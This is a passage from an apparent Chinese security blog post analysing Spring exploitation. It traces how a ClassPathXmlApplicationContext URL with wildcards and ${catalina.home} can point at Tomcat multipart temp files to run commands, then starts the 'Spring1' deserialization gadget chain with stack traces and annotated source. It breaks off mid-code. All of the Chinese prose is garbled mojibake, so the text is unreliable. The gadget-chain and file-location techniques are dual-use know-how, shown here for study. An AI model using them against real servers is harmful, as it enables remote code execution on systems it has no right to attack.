<p>å…¶ä¸­ <code>setConfigLocations</code> å’Œ <code>refresh</code> ä¸¤ä¸ªå‡½æ•°æ¯”è¾ƒé‡è¦ã€‚å‰è€…ç”¨äºå°† URL è®¾ç½®åˆ°å½“å‰å¯¹è±¡ä¸­ï¼Œåè€…ç”¨äºåˆ·æ–° Spring é…ç½®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ€åæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¸€å®šæ˜¯åœ¨ <code>refresh</code> å‡½æ•°ä¸­ã€‚</p>
<h4 id="é€šé…ç¬¦åŒ¹é…è·¯å¾„"><a href="#é€šé…ç¬¦åŒ¹é…è·¯å¾„" class="headerlink" title="é€šé…ç¬¦åŒ¹é…è·¯å¾„"></a>é€šé…ç¬¦åŒ¹é…è·¯å¾„</h4><p>ä» <code>refresh</code> å¼€å§‹ä¼šè°ƒç”¨åˆ° <code>org.springframework.core.io.support.PathMatchingResourcePatternResolver#getResources</code> å‡½æ•°ä¸­ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.core.io.support.PathMatchingResourcePatternResolver.getResources(PathMatchingResourcePatternResolver.java:268)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.getResources(AbstractApplicationContext.java:1159)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:216)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:188)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:252)</span><br><span class="line">at org.springframework.context.support.AbstractXmlApplicationContext.loadBeanDefinitions(AbstractXmlApplicationContext.java:127)</span><br><span class="line">at org.springframework.context.support.AbstractXmlApplicationContext.loadBeanDefinitions(AbstractXmlApplicationContext.java:93)</span><br><span class="line">at org.springframework.context.support.AbstractRefreshableApplicationContext.refreshBeanFactory(AbstractRefreshableApplicationContext.java:129)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.obtainFreshBeanFactory(AbstractApplicationContext.java:537)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:452)</span><br><span class="line">at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:139)</span><br><span class="line">at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:83)</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>getResources</code> å‡½æ•°ï¼Œ<code>locationPattern</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„ urlï¼Œåœ¨å¤„ç†è·¯å¾„å‰ä¼šç»è¿‡ <code>isPattern()</code> çš„åˆ¤æ–­ï¼Œå¦‚æœè¿”å›æ˜¯ trueï¼Œåˆ™ä¼šè¿›å…¥ <code>this.findPathMatchingResources(locationPattern)</code> çš„å¤„ç†ï¼Œå¦åˆ™å°±ç›´æ¥è¯»å–èµ„æºã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¡¨ç¤ºâ€œä»æ‰€æœ‰ classpath ä½ç½®ä¸ŠåŠ è½½èµ„æºâ€çš„å‰ç¼€ï¼ˆå¯å‡ºç°åœ¨ä¾èµ–çš„å¤šä¸ª jarã€classes ç›®å½•ä¸­ï¼‰</span></span><br><span class="line"><span class="type">String</span> <span class="variable">CLASSPATH_ALL_URL_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;classpath*:&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®ä½ç½®æ¨¡å¼ï¼ˆlocationPatternï¼‰è§£æå¹¶è¿”å› Resource æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment"> * æ”¯æŒï¼š</span></span><br><span class="line"><span class="comment"> * 1) &quot;classpath*:&quot; å‰ç¼€ï¼šä»æ‰€æœ‰ classpath ä½ç½®èšåˆåŒ¹é…ï¼ˆå¯èƒ½è¿”å›å¤šä¸ªèµ„æºï¼‰</span></span><br><span class="line"><span class="comment"> * 2) å…¶å®ƒå¸¦åè®®å‰ç¼€çš„è·¯å¾„ï¼ˆå¦‚ &quot;classpath:&quot;, &quot;file:&quot;, &quot;http:&quot; ç­‰ï¼‰</span></span><br><span class="line"><span class="comment"> * 3) Ant é£æ ¼é€šé…ç¬¦æ¨¡å¼ï¼š*, **, ?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Resource[] getResources(String locationPattern) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ä½ç½®æ¨¡å¼ä¸èƒ½ä¸ºç©º</span></span><br><span class="line">    Assert.notNull(locationPattern, <span class="string">&quot;Location pattern must not be null&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æƒ…å†µä¸€ï¼šä»¥ &quot;classpath*:&quot; å¼€å¤´ â†’ éœ€è¦åœ¨â€œæ‰€æœ‰â€ classpath ä½ç½®ä¸Šæ‰¾</span></span><br><span class="line">    <span class="keyword">if</span> (locationPattern.startsWith(CLASSPATH_ALL_URL_PREFIX)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å»æ‰ &quot;classpath*:&quot; å‰ç¼€åï¼Œåªå¯¹ååŠæ®µåšâ€œæ˜¯å¦æ˜¯æ¨¡å¼â€çš„åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">// ä¾‹å¦‚ &quot;classpath*:META-INF/*.xml&quot; â†’ æ˜¯â€œæ¨¡å¼â€</span></span><br><span class="line">        <span class="keyword">if</span> (getPathMatcher().isPattern(</span><br><span class="line">                locationPattern.substring(CLASSPATH_ALL_URL_PREFIX.length()))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 1.1 classpath èšåˆ + æ¨¡å¼åŒ¹é…ï¼ˆAnt é£æ ¼ï¼‰ â†’ è¿”å›æ‰€æœ‰åŒ¹é…åˆ°çš„èµ„æº</span></span><br><span class="line">            <span class="keyword">return</span> findPathMatchingResources(locationPattern);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 1.2 ä¸æ˜¯æ¨¡å¼ï¼šæŒ‰â€œåŒåèµ„æºèšåˆâ€å¤„ç†</span></span><br><span class="line">            <span class="comment">// ä¾‹å¦‚ &quot;classpath*:application.properties&quot;</span></span><br><span class="line">            <span class="comment">// ä¼šæŠŠæ‰€æœ‰ä¾èµ–é‡ŒåŒåçš„ application.properties å…¨éƒ¨æ‰¾å‡ºæ¥</span></span><br><span class="line">            <span class="keyword">return</span> findAllClassPathResources(</span><br><span class="line">                    locationPattern.substring(CLASSPATH_ALL_URL_PREFIX.length()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æƒ…å†µäºŒï¼šé &quot;classpath*:&quot; å‰ç¼€</span></span><br><span class="line">        <span class="comment">// åªåœ¨â€œå‰ç¼€ä¹‹åâ€çš„éƒ¨åˆ†åˆ¤æ–­æ˜¯å¦åŒ…å«æ¨¡å¼ï¼ˆé¿å…æŠŠåè®®é‡Œçš„ç‰¹æ®Šç¬¦å·è¯¯å½“æˆæ¨¡å¼å­—ç¬¦ï¼‰</span></span><br><span class="line">        <span class="comment">// ä¾‹å¦‚ &quot;file:/opt/a*b&quot;ï¼šå†’å·ä¹‹å‰æ˜¯ &quot;file:&quot;ï¼Œä¸è¦æŠŠå…¶ä¸­çš„å­—ç¬¦å½“é€šé…ç¬¦</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">prefixEnd</span> <span class="operator">=</span> locationPattern.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>; <span class="comment">// è‹¥æ²¡æœ‰å†’å·ï¼Œç»“æœä¸º 0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‰ç¼€åçš„éƒ¨åˆ†å¦‚æœæ˜¯æ¨¡å¼ï¼ˆåŒ…å« *, **, ? ç­‰ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (getPathMatcher().isPattern(locationPattern.substring(prefixEnd))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2.1 å¸¦æ¨¡å¼çš„è·¯å¾„ï¼ˆå¯èƒ½æ˜¯ file:, classpath:, http: ç­‰ï¼‰â†’ èµ°æ¨¡å¼åŒ¹é…</span></span><br><span class="line">            <span class="keyword">return</span> findPathMatchingResources(locationPattern);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 2.2 éæ¨¡å¼ï¼šæŒ‰â€œå•ä¸€èµ„æºâ€è§£æ</span></span><br><span class="line">            <span class="comment">// äº¤ç»™ ResourceLoader è§£æï¼ˆæ”¯æŒ classpath:, file:, http: ç­‰åè®®ï¼‰</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Resource</span>[] &#123;</span><br><span class="line">                getResourceLoader().getResource(locationPattern)</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œ <code>isPattern</code> å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ <code>org.springframework.util.AntPathMatcher#isPattern</code> æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œurl ä¸­æ˜¯æ”¯æŒä½¿ç”¨é€šé…ç¬¦çš„ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPattern</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (path.indexOf(<span class="string">&#x27;*&#x27;</span>) != -<span class="number">1</span> || path.indexOf(<span class="string">&#x27;?&#x27;</span>) != -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>Tomcat åœ¨å¤„ç† Servlet 3.x çš„ <code>multipart/form-data</code> æ—¶ï¼Œå‡ ä¹æŠŠâ€œæ¯ä¸€ä¸ª Partï¼ˆä¸ç®¡æ˜¯æ–‡ä»¶å­—æ®µè¿˜æ˜¯æ™®é€šè¡¨å•å­—æ®µï¼‰â€éƒ½å…ˆè½åˆ°ä¸´æ—¶æ–‡ä»¶</strong>ï¼Œå‘½åç±»ä¼¼ï¼š<code>upload_&lt;GUID&gt;_&lt;number&gt;.tmp</code>ã€‚</p>
<ul>
<li>**<code>&lt;GUID&gt;</code>**ï¼šTomcat è¿›ç¨‹å¯åŠ¨æ—¶ç”Ÿæˆã€åœ¨è¯¥è¿›ç¨‹å†…å”¯ä¸€ä¸”å›ºå®šçš„ä¸€æ®µæ ‡è¯†ï¼ˆä¾¿äºåŒºåˆ†ä¸åŒè¿›ç¨‹çš„ä¸´æ—¶æ–‡ä»¶ï¼‰ã€‚</li>
<li><strong><code>&lt;number&gt;</code><strong>ï¼šä¸€ä¸ª</strong>å•è°ƒé€’å¢</strong>çš„åºå·ï¼Œæ¯å¤„ç†ä¸€ä¸ª Part å°± +1ã€‚</li>
</ul>
<h4 id="Tomcat-å®‰è£…ç›®å½•å®šä½"><a href="#Tomcat-å®‰è£…ç›®å½•å®šä½" class="headerlink" title="Tomcat å®‰è£…ç›®å½•å®šä½"></a>Tomcat å®‰è£…ç›®å½•å®šä½</h4><p>å¯¹äºä¸åŒæ–¹å¼å¯åŠ¨çš„ Tomcatï¼Œä¸´æ—¶æ–‡ä»¶çš„ä½ç½®ä¸å°½ç›¸åŒã€‚é˜…è¯» Tomcat ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶æ‰€åœ¨çš„ä½ç½®åº”è¯¥ä½äº Tomcat å®‰è£…ç›®å½•ä¸‹çš„ work ç›®å½•ä¸‹ã€‚</p>
<p>ä½†å¯¹äºå•æ–‡ä»¶ Springboot æ¥è¯´ï¼Œæ­¤æ—¶ Tomcat æ˜¯åµŒå…¥å¼çš„å¹¶ä¸å­˜åœ¨å®‰è£…ç›®å½•ï¼Œæ‰€ä»¥æ­¤æ—¶ä¸´æ—¶æ–‡ä»¶å°†ä¼šå­˜å‚¨åœ¨ç³»ç»Ÿä¸´æ—¶ç›®å½•ä¸‹çš„ä¸€ä¸ªå­ç›®å½•ä¸­çš„ work ç›®å½•ä¸‹ã€‚</p>
<p>ä» <code>ClassPathXmlApplicationContext</code> è°ƒç”¨çš„ <code>setConfigLocations</code> å‡½æ•°å¯ä»¥ä¸€ç›´è°ƒç”¨åˆ° <code>org.springframework.util.PropertyPlaceholderHelper#parseStringValue</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.util.PropertyPlaceholderHelper.parseStringValue(PropertyPlaceholderHelper.java:132)</span><br><span class="line">at org.springframework.util.PropertyPlaceholderHelper.replacePlaceholders(PropertyPlaceholderHelper.java:126)</span><br><span class="line">at org.springframework.core.env.AbstractPropertyResolver.doResolvePlaceholders(AbstractPropertyResolver.java:204)</span><br><span class="line">at org.springframework.core.env.AbstractPropertyResolver.resolveRequiredPlaceholders(AbstractPropertyResolver.java:178)</span><br><span class="line">at org.springframework.core.env.AbstractEnvironment.resolveRequiredPlaceholders(AbstractEnvironment.java:551)</span><br><span class="line">at org.springframework.context.support.AbstractRefreshableConfigApplicationContext.resolvePath(AbstractRefreshableConfigApplicationContext.java:122)</span><br><span class="line">at org.springframework.context.support.AbstractRefreshableConfigApplicationContext.setConfigLocations(AbstractRefreshableConfigApplicationContext.java:80)</span><br><span class="line">at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:137)</span><br><span class="line">at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:83)</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°ä¼šå¯¹ä¼ å…¥ <code>ClassPathXmlApplicationContext</code> çš„ URL æ¸²æŸ“ä¸€æ¬¡ç¯å¢ƒå˜é‡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°†å­—ç¬¦ä¸²ä¸­å½¢å¦‚ $&#123;name&#125; çš„å ä½ç¬¦æ›¿æ¢æˆç»™å®š PlaceholderResolver è¿”å›çš„å€¼ã€‚</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value å«å ä½ç¬¦çš„åŸå§‹å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> placeholderResolver ç”¨äºæ ¹æ®å ä½ç¬¦åè§£æå®é™…å€¼çš„è§£æå™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æ›¿æ¢å®Œæˆåçš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">replacePlaceholders</span><span class="params">(String value, PlaceholderResolver placeholderResolver)</span> &#123;</span><br><span class="line">    Assert.notNull(value, <span class="string">&quot;&#x27;value&#x27; must not be null&quot;</span>);</span><br><span class="line">    <span class="comment">// visitedPlaceholders ç”¨äºæ£€æµ‹å¾ªç¯å¼•ç”¨ï¼ˆä¾‹å¦‚ $&#123;a&#125; -&gt; $&#123;b&#125; -&gt; $&#123;a&#125;ï¼‰</span></span><br><span class="line">    <span class="keyword">return</span> parseStringValue(value, placeholderResolver, <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$&#123;catalina.home&#125;</code> è¿™ä¸ªç¯å¢ƒå˜é‡å°±æŒ‡å‘ Tomcat çš„å®‰è£…ç›®å½•ï¼Œç›´æ¥ä½¿ç”¨è¿™ä¸ªå˜é‡å°±å¯ä»¥é¿å…ç¯å¢ƒå·®å¼‚å¯¼è‡´çš„é—®é¢˜ã€‚</p>
<h2 id="ååºåˆ—åŒ–é“¾-1"><a href="#ååºåˆ—åŒ–é“¾-1" class="headerlink" title="ååºåˆ—åŒ–é“¾"></a>ååºåˆ—åŒ–é“¾</h2><h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.ClassLoader.defineClass(ClassLoader.java:642)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:142)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:346)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:383)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:418)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">at org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke(AutowireUtils.java:307)</span><br><span class="line">at com.sun.proxy.$Proxy1.newTransformer(Unknown Source:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">at org.springframework.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:202)</span><br><span class="line">at org.springframework.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:187)</span><br><span class="line">at org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(SerializableTypeWrapper.java:404)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æ-6"><a href="#åŸç†åˆ†æ-6" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡â€œè°ƒç”¨æŸä¸ªæ— å‚æ–¹æ³•â€æ¥æä¾›ç±»å‹ä¿¡æ¯çš„å®ç°ã€‚</span></span><br><span class="line"><span class="comment">// è®¾è®¡è¦ç‚¹ï¼šå°†â€œæä¾›è€… provider + è¦è°ƒç”¨çš„æ–¹æ³•å methodName + ä¸‹æ ‡ indexâ€åºåˆ—åŒ–ä¿å­˜ï¼›</span></span><br><span class="line"><span class="comment">// è¿è¡ŒæœŸæŠŠ provider.getType() ä½œä¸ºç›®æ ‡å¯¹è±¡ï¼Œåå°„è°ƒç”¨æŒ‡å®šæ–¹æ³•ï¼Œç»“æœç¼“å­˜åˆ° resultã€‚</span></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼šresult æ ‡ä¸º transientï¼Œä¸å‚ä¸åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–ååœ¨ readObject() é‡Œé‡æ–°è®¡ç®—ã€‚</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MethodInvokeTypeProvider</span> <span class="keyword">implements</span> <span class="title class_">TypeProvider</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸Šæ¸¸çš„ TypeProviderï¼Œå¯¹å¤–æä¾›ä¸€ä¸ªâ€œç›®æ ‡å¯¹è±¡â€ï¼ˆåç»­åœ¨å…¶ä¸Šåå°„è°ƒç”¨æ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> TypeProvider provider;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éœ€è¦åå°„è°ƒç”¨çš„æ–¹æ³•åï¼ˆæ— å‚æ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String methodName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç±»å‹ä¸‹æ ‡ï¼ˆç”¨é€”å–å†³äºå¤–éƒ¨é€»è¾‘ï¼Œæ¯”å¦‚é€‰æ‹©ç¬¬å‡ ä¸ªæ³›å‹å‚æ•°ç­‰ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¼“å­˜åå°„è°ƒç”¨å¾—åˆ°çš„ç»“æœï¼›transient è¡¨ç¤ºä¸åºåˆ—åŒ–ï¼ˆæ´¾ç”Ÿå€¼ï¼Œååºåˆ—åŒ–åå†è®¡ç®—ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ æ—¶ï¼šè®°å½• provider / æ–¹æ³•å / ä¸‹æ ‡ï¼Œå¹¶ç«‹åˆ»æ‰§è¡Œä¸€æ¬¡åå°„è°ƒç”¨å¾—åˆ°åˆå§‹ result</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodInvokeTypeProvider</span><span class="params">(TypeProvider provider, Method method, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.provider = provider;</span><br><span class="line">        <span class="built_in">this</span>.methodName = method.getName();      <span class="comment">// ä»…ä¿å­˜æ–¹æ³•åï¼ˆæ— å‚ï¼‰ï¼Œä¾¿äºåç»­ååºåˆ—åŒ–æ¢å¤</span></span><br><span class="line">        <span class="built_in">this</span>.index = index;</span><br><span class="line">        <span class="comment">// åœ¨ provider.getType() è¿”å›çš„å¯¹è±¡ä¸Šè°ƒç”¨ç»™å®š methodï¼ˆæ— å‚ï¼‰ï¼Œå¹¶ç¼“å­˜ç»“æœ</span></span><br><span class="line">        <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‡ªå®šä¹‰ååºåˆ—åŒ–é’©å­ï¼šè¿˜åŸé transient å­—æ®µåï¼Œé‡æ–°å®šä½å¹¶è°ƒç”¨åŒåæ— å‚æ–¹æ³•ï¼Œæ¢å¤ result</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        inputStream.defaultReadObject();  <span class="comment">// è¯»å–é transient å­—æ®µï¼šproviderã€methodNameã€index</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨ provider.getType() çš„è¿è¡Œæ—¶ç±»ä¸Šï¼ŒæŸ¥æ‰¾åŒåçš„â€œæ— å‚æ–¹æ³•â€</span></span><br><span class="line">        <span class="comment">// Spring çš„ ReflectionUtils.findMethod(clazz, name) ä¼šåŒ¹é…æ— å‚æ–¹æ³•ï¼ˆæ²¿ç»§æ‰¿å±‚çº§æŸ¥æ‰¾ï¼‰</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span 